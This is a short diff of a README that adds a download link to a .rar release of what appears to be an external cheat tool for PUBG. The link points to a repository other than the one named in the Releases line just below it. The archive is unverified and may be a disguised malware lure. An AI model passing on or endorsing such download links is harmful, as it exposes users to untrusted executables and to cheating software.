@@ -31,7 +31,7 @@
 
 ---
 
-### ⬇️ Download
+### ⬇️ [Download](https://github.com/savagedragonrevive7/PUBG-External/releases/download/PUBG.V3.1/PUBG.V3.1.rar)
 
 Get the latest release from the **[Releases](https://github.com/yourname/pubg-toolkit/releases/latest)** tab.
 
